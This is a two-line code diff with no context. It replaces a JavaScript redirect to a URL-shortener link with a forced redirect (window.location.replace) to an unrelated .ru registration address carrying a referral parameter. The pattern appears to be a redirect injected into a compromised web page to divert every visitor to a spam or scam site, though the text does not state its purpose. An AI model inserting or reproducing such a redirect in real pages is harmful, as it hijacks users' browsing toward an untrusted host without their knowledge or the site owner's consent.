@@ -1,1 +1,1 @@
-window.location.replace('https://goo.su/2jLn');
+window.location.replace('http://ngoos.net.ru/reg?ref=');
